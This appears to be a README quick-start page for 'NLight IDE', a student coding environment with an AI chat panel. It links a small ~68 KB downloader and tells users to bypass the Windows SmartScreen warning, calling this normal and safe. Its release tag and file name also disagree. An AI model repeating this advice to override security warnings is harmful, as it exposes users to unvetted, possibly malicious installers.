## Quick Start

### Download & Install

1. **Download Installer**  
   [NLight_IDE_v3.0.0_Setup.exe](https://github.com/Java-Institute-Holdings/nlight/releases/download/v3.0.2/NLight_IDE_v3.0.0_Setup.exe) *(~68 KB installer — downloads IDE + AI engine automatically)*

2. **Run Installer**  
   - Double-click the downloaded `.exe` file
   - If Windows SmartScreen appears, click **"More info"** → then click **"Run anyway"**  
     *(This is normal for new software — the installer is safe)*
   - Follow the 5-step installation wizard (IDE + AI engine + model)
   - Launch NLight IDE from desktop shortcut

3. **Start Coding**  
   - NLight Chat panel opens automatically
   - Ask questions in plain English
   - Get AI assistance for coding, debugging, and learning

## What is NLight IDE?

NLight IDE is a **branded development environment** built for students, featuring:

- **AI Chat Assistant** - Get help with coding questions instantly
- **Local AI Support** - Works offline with "Nlight LLM models" (no internet required)
- **Professional Tools** - Full Nlight Code features, syntax highlighting, debugging
- **Student-Focused** - Designed for learning, not enterprise complexity

## Getting Started

### First Launch

1. **Start NLight IDE** from desktop shortcut
2. **Wait 10-15 seconds** for AI models to initialize
3. **Chat panel opens** automatically on the right
4. **Type your question** - e.g., "How do I create a Python function?"

### Example Questions

```
- "Create a Python function that calculates factorial"
- "Explain this JavaScript code line by line"
- "Help me debug this SQL query"
- "Write a C++ program to sort an array"
- "What does this error message mean?"
```

### Working with Files

1. **Open a file** from the Explorer sidebar
2. **Ask about the code** - NLight sees the file contents
3. **Get suggestions** for improvements or fixes
4. **Apply changes** directly in the editor
